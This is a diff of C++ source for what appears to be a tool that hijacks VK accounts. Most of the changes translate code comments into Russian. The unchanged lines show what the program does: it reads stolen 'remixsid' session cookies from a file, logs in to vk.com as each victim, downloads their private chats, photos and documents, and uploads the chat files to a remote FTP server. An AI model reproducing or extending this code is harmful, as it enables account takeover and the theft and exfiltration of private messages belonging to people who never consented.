@@ -8,7 +8,7 @@ extern vector<user*> allUsers;
 extern HANDLE hConsole;
 
 /**
-* Download all content from dialog
+* Download content from dialog
 */
 void compute_content_chat(const char* remixsid)
 {
@@ -49,12 +49,12 @@ void compute_content_chat(const char* remixsid)
 			continue;
 		currentChat = allChats.at(n);
 
-		// Create Dirrectory by chat
+		// Создаем дирректорию чата
 		_snprintf(chatPath, MAX_PATH, "%s/%s - %s",
 			userPath, currentChat->name, currentChat->id);
 		mmkdir(chatPath);
 
-		// Create FileName for result file
+		// Создаем файл, куда будем выводить диалог
 		_snprintf(chatFile, MAX_PATH, "%s/%s - %s.html",
 			chatPath, currentChat->name, currentChat->id);
 
@@ -62,7 +62,7 @@ void compute_content_chat(const char* remixsid)
 		currentChat->download = "Downloading...\0";
 		print_users(allChats);
 
-		// Download Chat
+		// Загружаем чаты
 		fstream fs(chatFile, ios::out);
 		char* dialogHtml = download_chat(remixsid, currentChat->id);
 		fs << patternDialog;
@@ -70,13 +70,13 @@ void compute_content_chat(const char* remixsid)
 		fs.flush();
 		fs.close();
 
-		// Upload chat to the (s)ftp server. 
+		// Выгружаем чаты на сервер 
 		if (UPLOAD_CHAT) {
 			//upload_file_sftp(SERVER_ADDRESS, SERVER_USERNAME, SERVER_PRIVATE_KEYFILE, chatFile);
 			upload_file_ftp(SERVER_ADDRESS, SERVER_USERNAME, SERVER_USERPWD, chatFile);
 		}
 
-		// Download photo from chat.
+		// Загружаем изображения с чатов
 		if (DOWNLOAD_PHOTO_FROM_CHAT)
 			download_photo(dialogHtml, chatPath);
 		
@@ -152,7 +152,7 @@ char* download_chat(const char* remixsid, const char* id)
 
 /**
 * Download Photo from Chat.
-* Return number success download photo.
+* Return: number success downloaded photo.
 */
 int download_photo(const char* dialogHtml, const char* path)
 {
@@ -216,8 +216,8 @@ int download_photo(const char* dialogHtml, const char* path)
 }
 
 /**
-* Download Documents by User.
-* Return number success download document.
+* Download User's Documents.
+* Return number success downloaded document.
 */
 int download_doc(const char* remixsid)
 {
@@ -290,8 +290,8 @@ int download_doc(const char* remixsid)
 }
 
 /**
-* Add information about exist chats (dialogs) by user
-* Return number download chats's information.
+* Add information about exist chats.
+* Return number downloaded chats.
 */
 int get_dialog_list(const char* remixsid)
 {
@@ -493,10 +493,10 @@ char* get_pattern_dialog()
 }
 
 /**
-* Read content from #define IN_FILE_PATH.
+* Read content.
 * Find cookie.
 * Authorization "https://vk.com" with cookie
-* and add information about user to vector<> allUsers;
+* Add information about user in vector<> allUsers;
 */
 void read_cookies()
 {
